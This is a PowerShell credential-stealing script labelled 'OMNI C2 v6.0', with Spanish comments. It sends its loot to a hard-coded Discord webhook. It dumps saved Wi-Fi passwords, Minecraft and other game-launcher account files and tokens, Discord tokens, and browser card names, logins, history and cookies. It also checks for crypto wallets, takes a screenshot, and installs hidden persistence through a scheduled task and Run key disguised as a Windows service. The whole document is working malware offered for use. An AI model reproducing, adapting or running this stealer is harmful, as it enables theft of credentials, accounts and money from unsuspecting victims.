# ============================================================
# OMNI C2 v6.0 - PAYLOAD PRINCIPAL
# ============================================================

param(
    [string]$WebhookUrl = "https://discord.com/api/webhooks/1510348415148495009/Z2jNquIANWEm9YqLD0dgBmxCj4cMAG8fAtX-1_YukxV2rNwCSBbSwY4meOLj8LqibrRe"
)

$VictimID = "$env:COMPUTERNAME-$((Get-Random -Maximum 99999))"

function Send-C2 {
    param([string]$Content, [string]$File = $null)
    $body = @{content = "`n[$VictimID]`n$Content"} | ConvertTo-Json
    try {
        if ($File -and (Test-Path $File)) {
            $uri = $WebhookUrl + "?wait=true"
            $form = @{payload_json = $body; file = Get-Item $File}
            Invoke-RestMethod -Uri $uri -Method Post -Form $form -ErrorAction SilentlyContinue
        } else {
            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
        }
    } catch {}
}

function Send-FileEx {
    param([string]$Path, [string]$Label)
    if (Test-Path $Path) {
        try {
            $content = Get-Content $Path -Raw -ErrorAction SilentlyContinue -Encoding UTF8
            if ($null -eq $content) { $content = "[BINARIO - $((Get-Item $Path).Length) bytes]" }
            if ($content.Length -gt 1900) { $content = $content.Substring(0, 1900) + "..." }
            Send-C2 -Content "📄 **$Label**`n`n$content"
        } catch {}
    }
}

# ===== 1. SISTEMA =====
$os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
$cpu = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
$ram = [math]::Round((Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB, 1)
try { $publicIP = (Invoke-RestMethod "https://api.ipify.org" -TimeoutSec 5 -ErrorAction Stop) } catch { $publicIP = "N/A" }

Send-C2 -Content @"
🎯 **NUEVA VÍCTIMA CONECTADA**
🖥️ **SISTEMA**
PC: $env:COMPUTERNAME
Usuario: $env:USERNAME
OS: $($os.Caption) $($os.Version)
CPU: $($cpu.Name) | $($cpu.NumberOfCores) núcleos
RAM: ${ram}GB
IP Pública: $publicIP
"@

# ===== 2. WIFI =====
$wifiResult = "📶 **WIFI**`n"
$profiles = netsh wlan show profiles | Select-String "Perfil de todos|All User Profile" | ForEach-Object { $_ -replace '.*:\s+', '' }
foreach ($p in $profiles) {
    try {
        $details = netsh wlan show profile name="$p" key=clear
        $pass = $details | Select-String "Contenido de la clave|Key Content" | ForEach-Object { $_ -replace '.*:\s+', '' }
        if (-not $pass) { $pass = "Sin contraseña" }
        $wifiResult += "📶 $p : $pass`n"
    } catch {}
}
Send-C2 -Content $wifiResult

# ===== 3. MINECRAFT =====
$mcResult = "⛏️ **MINECRAFT - ROBO COMPLETO**`n"

$paths = @(
    "$env:APPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\launcher_profiles.json",
    "$env:APPDATA\.minecraft\usercache.json",
    "$env:APPDATA\.minecraft\launcher_msa_credentials.json"
)
foreach ($p in $paths) {
    if (Test-Path $p) { 
        $mcResult += "✅ $([System.IO.Path]::GetFileName($p))`n"
        Send-FileEx -Path $p -Label "Minecraft - $([System.IO.Path]::GetFileName($p))"
        $data = Get-Content $p -Raw -ErrorAction SilentlyContinue
        if ($data -match '"name"\s*:\s*"([^"]+)"') { $mcResult += "   👤 Usuario: $($matches[1])`n" }
        if ($data -match '"accessToken"\s*:\s*"([^"]+)"') { $mcResult += "   🔑 Token presente`n" }
        if ($data -match '"uuid"\s*:\s*"([^"]+)"') { $mcResult += "   🆔 UUID: $($matches[1])`n" }
    }
}

foreach ($p in @("$env:APPDATA\.tlauncher\accounts.json","$env:APPDATA\TLauncher\accounts.json")) {
    if (Test-Path $p) { $mcResult += "✅ TLauncher`n"; Send-FileEx -Path $p -Label "TLauncher" }
}

$launchers = @(
    @{N="Lunar Client"; P="$env:APPDATA\.lunarclient\settings.json"},
    @{N="Badlion"; P="$env:APPDATA\BadlionClient\accounts.json"},
    @{N="Feather"; P="$env:APPDATA\.feather\accounts.json"},
    @{N="Prism"; P="$env:APPDATA\PrismLauncher\accounts.json"},
    @{N="MultiMC"; P="$env:APPDATA\MultiMC\accounts.json"},
    @{N="PolyMC"; P="$env:APPDATA\PolyMC\accounts.json"},
    @{N="ATLauncher"; P="$env:APPDATA\ATLauncher\accounts.json"},
    @{N="CurseForge"; P="$env:APPDATA\curseforge\minecraft\launcher_accounts.json"},
    @{N="GDLauncher"; P="$env:APPDATA\GDLauncher\accounts.json"},
    @{N="HMCL"; P="$env:APPDATA\HMCL\accounts.json"},
    @{N="SKlauncher"; P="$env:APPDATA\SKlauncher\accounts.json"},
    @{N="Salwyrr"; P="$env:APPDATA\Salwyrr\accounts.json"},
    @{N="Betacraft"; P="$env:APPDATA\betacraft\accounts.json"}
)
foreach ($l in $launchers) {
    if (Test-Path $l.P) { $mcResult += "✅ $($l.N)`n"; Send-FileEx -Path $l.P -Label "$($l.N)" }
}

if (Test-Path "$env:APPDATA\.minecraft\lastlogin") { $mcResult += "✅ Legacy login`n"; Send-FileEx -Path "$env:APPDATA\.minecraft\lastlogin" -Label "Legacy" }
if (Test-Path "$env:APPDATA\.minecraft\servers.dat") { $mcResult += "✅ Servidores recientes`n"; Send-FileEx -Path "$env:APPDATA\.minecraft\servers.dat" -Label "Servers.dat" }
$serversDir = "$env:APPDATA\.minecraft\servers"
if (Test-Path $serversDir) { $serverFiles = Get-ChildItem $serversDir -Filter "*.json" -ErrorAction SilentlyContinue; if ($serverFiles) { $mcResult += "✅ $($serverFiles.Count) servidores`n" } }

$ssDir = "$env:APPDATA\.minecraft\screenshots"
if (Test-Path $ssDir) { $ss = Get-ChildItem $ssDir -Filter "*.png" -ErrorAction SilentlyContinue; $mcResult += "✅ $($ss.Count) screenshots`n"; foreach ($s in $ss | Select-Object -First 3) { Send-C2 -Content "📸 Screenshot" -File $s.FullName } }

$logsDir = "$env:APPDATA\.minecraft\logs"
if (Test-Path $logsDir) { $mcResult += "✅ Logs encontrados`n"; $latestLog = Get-ChildItem $logsDir -Filter "latest.log" -ErrorAction SilentlyContinue | Select-Object -First 1; if ($latestLog -and $latestLog.Length -lt 50000) { Send-FileEx -Path $latestLog.FullName -Label "latest.log" } }

$savesDir = "$env:APPDATA\.minecraft\saves"
if (Test-Path $savesDir) { $worlds = Get-ChildItem $savesDir -Directory -ErrorAction SilentlyContinue; $mcResult += "✅ $($worlds.Count) mundos`n" }

$modsDir = "$env:APPDATA\.minecraft\mods"
if (Test-Path $modsDir) { $mods = Get-ChildItem $modsDir -Filter "*.jar" -ErrorAction SilentlyContinue; $mcResult += "✅ $($mods.Count) mods`n"; foreach ($m in $mods | Select-Object -First 10) { $mcResult += "   📦 $($m.Name)`n" } }

$bedrock = Get-ChildItem "$env:LOCALAPPDATA\Packages\Microsoft.MinecraftUWP_*\LocalState\games\com.mojang\" -ErrorAction SilentlyContinue
if ($bedrock) { $mcResult += "✅ Minecraft Bedrock detectado`n" }

$hypixelLogs = Get-ChildItem "$env:APPDATA\.minecraft\logs" -Filter "*.log" -ErrorAction SilentlyContinue
foreach ($hl in $hypixelLogs) {
    try { $content = Get-Content $hl.FullName -Raw -ErrorAction SilentlyContinue; if ($content -match "hypixel") { $mcResult += "✅ Hypixel detectado en logs`n"; break } } catch {}
}

Send-C2 -Content $mcResult

# ===== 4. DISCORD =====
$discResult = "💬 **DISCORD**`n"
$clients = @("$env:APPDATA\discord","$env:APPDATA\discordcanary","$env:APPDATA\discordptb","$env:LOCALAPPDATA\Discord","$env:LOCALAPPDATA\discordcanary","$env:LOCALAPPDATA\discordptb")
$tokens = @()
foreach ($base in $clients) {
    $ldb = "$base\Local Storage\leveldb"
    if (Test-Path $ldb) {
        $files = Get-ChildItem $ldb -Filter "*.ldb" -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            try { $content = Get-Content $file.FullName -Raw -Encoding UTF8 -ErrorAction SilentlyContinue; if ($content) { $regex = [regex]'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}'; $matches = $regex.Matches($content); foreach ($m in $matches) { if ($m.Value -notin $tokens) { $tokens += $m.Value } }; $mfaRegex = [regex]'mfa\.[a-zA-Z0-9_-]{84}'; $mfaMatches = $mfaRegex.Matches($content); foreach ($m in $mfaMatches) { if ($m.Value -notin $tokens) { $tokens += $m.Value } } } } catch {}
    }
}
foreach ($bp in @("$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb","$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb","$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb")) {
    if (Test-Path $bp) { $files = Get-ChildItem $bp -Filter "*.ldb" -ErrorAction SilentlyContinue; foreach ($file in $files) { try { $content = Get-Content $file.FullName -Raw -Encoding UTF8 -ErrorAction SilentlyContinue; if ($content -match '[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}') { if ($matches[0] -notin $tokens) { $tokens += $matches[0] } } } catch {} } }
}
if ($tokens.Count -gt 0) { $discResult += "🎯 $($tokens.Count) TOKENS`n"; foreach ($t in $tokens) { $discResult += "🔑 $($t.Substring(0,[Math]::Min(50,$t.Length)))...`n" } } else { $discResult += "❌ Sin tokens`n" }
Send-C2 -Content $discResult

# ===== 5. TARJETAS =====
$cardsResult = "💳 **TARJETAS**`n"
$browsersCards = @(@{N="Chrome";P="$env:LOCALAPPDATA\Google\Chrome\User Data"},@{N="Edge";P="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},@{N="Brave";P="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"})
$totalCards = 0
foreach ($b in $browsersCards) {
    if (-not (Test-Path $b.P)) { continue }
    foreach ($profile in @("Default","Profile 1","Profile 2")) {
        $webData = "$($b.P)\$profile\Web Data"
        if (Test-Path $webData) {
            try {
                $tempDb = "$env:TEMP\wd_$((Get-Random -Maximum 99999)).db"
                Copy-Item $webData $tempDb -Force -ErrorAction SilentlyContinue
                Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue
                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Read Only=True")
                $conn.Open()
                $cmd = $conn.CreateCommand()
                $cmd.CommandText = "SELECT name_on_card, expiration_month, expiration_year FROM credit_cards"
                $reader = $cmd.ExecuteReader()
                while ($reader.Read()) { $totalCards++; $cardsResult += "   💳 $($reader["name_on_card"]) | $($reader["expiration_month"])/$($reader["expiration_year"]) | $($b.N)`n" }
                $reader.Close(); $conn.Close()
                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            } catch {}
        }
    }
}
if ($totalCards -eq 0) { $cardsResult += "❌ Sin tarjetas`n" } else { $cardsResult += "🔥 Total: $totalCards tarjetas`n" }
Send-C2 -Content $cardsResult

# ===== 6. NAVEGADORES =====
$browsResult = "🌐 **NAVEGADORES**`n"
$browsers = @(
    @{N="Chrome";P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
    @{N="Edge";P="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"},
    @{N="Brave";P="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"},
    @{N="Opera";P="$env:APPDATA\Opera Software\Opera Stable\Login Data"},
    @{N="Vivaldi";P="$env:LOCALAPPDATA\Vivaldi\User Data\Default\Login Data"}
)
foreach ($b in $browsers) { if (Test-Path $b.P) { $size = [math]::Round((Get-Item $b.P).Length/1KB,1); $browsResult += "✅ $($b.N) ($size KB)`n" } }
$ff = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue | Select-Object -First 1
if ($ff) { $browsResult += "✅ Firefox ($($ff.Name))`n" }
Send-C2 -Content $browsResult

# ===== 7. CONTRASEÑAS CHROME =====
$loginDb = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
if (Test-Path $loginDb) {
    try {
        $tempDb = "$env:TEMP\cp_$((Get-Random -Maximum 99999)).db"
        Copy-Item $loginDb $tempDb -Force -ErrorAction SilentlyContinue
        Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Read Only=True")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT origin_url, username_value FROM logins LIMIT 30"
        $reader = $cmd.ExecuteReader()
        $pwResult = "🔑 **CONTRASEÑAS CHROME**`n"
        $count = 0
        while ($reader.Read()) { $count++; $url = $reader["origin_url"]; $user = $reader["username_value"]; if ($url -and $user) { $pwResult += "   $url → $user`n" } }
        $reader.Close(); $conn.Close()
        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
        $pwResult += "   🔥 $count sitios`n"
        Send-C2 -Content $pwResult
    } catch {}
}

# ===== 8. HISTORIAL =====
$historyDb = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
if (Test-Path $historyDb) {
    try {
        $tempDb = "$env:TEMP\ch_$((Get-Random -Maximum 99999)).db"
        Copy-Item $historyDb $tempDb -Force -ErrorAction SilentlyContinue
        Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Read Only=True")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 15"
        $reader = $cmd.ExecuteReader()
        $histResult = "📜 **HISTORIAL RECIENTE**`n"
        while ($reader.Read()) { $url = $reader["url"]; $title = $reader["title"]; if ($url) { $histResult += "   $title`n   $url`n" } }
        $reader.Close(); $conn.Close()
        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
        Send-C2 -Content $histResult
    } catch {}
}

# ===== 9. COOKIES =====
$cookiesDb = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
if (Test-Path $cookiesDb) {
    try {
        $tempDb = "$env:TEMP\ck_$((Get-Random -Maximum 99999)).db"
        Copy-Item $cookiesDb $tempDb -Force -ErrorAction SilentlyContinue
        Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Read Only=True")
        $conn.Open()
        $ckResult = "🍪 **COOKIES IMPORTANTES**`n"
        foreach ($site in @("%google%","%facebook%","%twitter%","%instagram%","%tiktok%","%github%","%netflix%","%spotify%","%amazon%","%paypal%","%roblox%","%epicgames%","%steam%")) {
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT host_key, name FROM cookies WHERE host_key LIKE '$site' LIMIT 3"
            $reader = $cmd.ExecuteReader()
            $found = $false
            while ($reader.Read()) { if (-not $found) { $ckResult += "   $site`:n"; $found = $true }; $ckResult += "      $($reader["host_key"]) → $($reader["name"])`n" }
            $reader.Close()
        }
        $conn.Close()
        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
        Send-C2 -Content $ckResult
    } catch {}
}

# ===== 10. CRIPTO =====
$cryptoResult = "💰 **CRIPTO**`n"
$wallets = @(
    @{N="MetaMask Chrome";P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"},
    @{N="MetaMask Edge";P="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Extension Settings\ejbalbakoplchlghecdalmeeeajnimhm"},
    @{N="Exodus";P="$env:APPDATA\Exodus"},
    @{N="Electrum";P="$env:APPDATA\Electrum"},
    @{N="Atomic";P="$env:APPDATA\atomic"},
    @{N="Coinbase";P="$env:APPDATA\Coinbase"},
    @{N="Binance";P="$env:APPDATA\Binance"},
    @{N="Trust Wallet";P="$env:LOCALAPPDATA\TrustWallet"},
    @{N="Ledger";P="$env:APPDATA\Ledger Live"},
    @{N="Phantom";P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa"}
)
$found = $false
foreach ($w in $wallets) { if (Test-Path $w.P) { $cryptoResult += "✅ $($w.N)`n"; $found = $true } }
if (-not $found) { $cryptoResult += "❌ Sin wallets`n" }
Send-C2 -Content $cryptoResult

# ===== 11. JUEGOS =====
$gamesResult = "🎮 **JUEGOS**`n"
if (Test-Path "$env:PROGRAMFILES(x86)\Steam") { 
    $gamesResult += "✅ Steam instalado`n"
    $steamLogin = "$env:PROGRAMFILES(x86)\Steam\config\loginusers.vdf"
    if (Test-Path $steamLogin) {
        $content = Get-Content $steamLogin -Raw -ErrorAction SilentlyContinue
        if ($content -match '"AccountName"\s*"([^"]+)"') { $gamesResult += "   👤 Steam: $($matches[1])`n" }
        Send-FileEx -Path $steamLogin -Label "Steam loginusers"
    }
}
if (Test-Path "$env:LOCALAPPDATA\EpicGamesLauncher") { $gamesResult += "✅ Epic Games instalado`n" }
if (Test-Path "$env:LOCALAPPDATA\Riot Games") { 
    $gamesResult += "✅ Riot Games (LoL/Valorant) instalado`n"
    $riotSettings = "$env:LOCALAPPDATA\Riot Games\Riot Client\Data\RiotClientSettings.yaml"
    if (Test-Path $riotSettings) { Send-FileEx -Path $riotSettings -Label "Riot Settings" }
}
if (Test-Path "$env:LOCALAPPDATA\Battle.net") { $gamesResult += "✅ Battle.net instalado`n" }
if (Test-Path "$env:APPDATA\Spotify") { $gamesResult += "✅ Spotify instalado`n"; $spotifyUsers = "$env:APPDATA\Spotify\users.json"; if (Test-Path $spotifyUsers) { Send-FileEx -Path $spotifyUsers -Label "Spotify users" } }
if (Test-Path "$env:APPDATA\Telegram Desktop") { $gamesResult += "✅ Telegram Desktop instalado`n"; if (Test-Path "$env:APPDATA\Telegram Desktop\tdata") { $gamesResult += "   🔐 sesión recuperable`n" } }
Send-C2 -Content $gamesResult

# ===== 12. CAPTURA DE PANTALLA =====
try {
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName System.Windows.Forms
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
    $tempFile = "$env:TEMP\ss_$((Get-Random -Maximum 99999)).png"
    $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose(); $bitmap.Dispose()
    Send-C2 -Content "📸 **Captura de pantalla**" -File $tempFile
    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
} catch {}

# ===== 13. PERSISTENCIA =====
try {
    $persistPath = "$env:APPDATA\Microsoft\Windows\svchost.ps1"
    $currentScript = Get-Content $PSCommandPath -Raw -ErrorAction SilentlyContinue
    if ($currentScript) { Set-Content -Path $persistPath -Value $currentScript -Force; $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistPath`""; $trigger = New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -TaskName "WindowsBgSvc" -Action $action -Trigger $trigger -Force -ErrorAction SilentlyContinue; Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsBgSvc" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistPath`"" -Force }
    Send-C2 -Content "🔄 **Persistencia instalada** - El agente se reinicia con Windows"
} catch { Send-C2 -Content "❌ Error en persistencia" }

# ===== 14. FIN =====
Send-C2 -Content "✅ **EXTRACCIÓN COMPLETA** - Todos los datos han sido enviados"

while ($true) { Start-Sleep -Seconds 60 }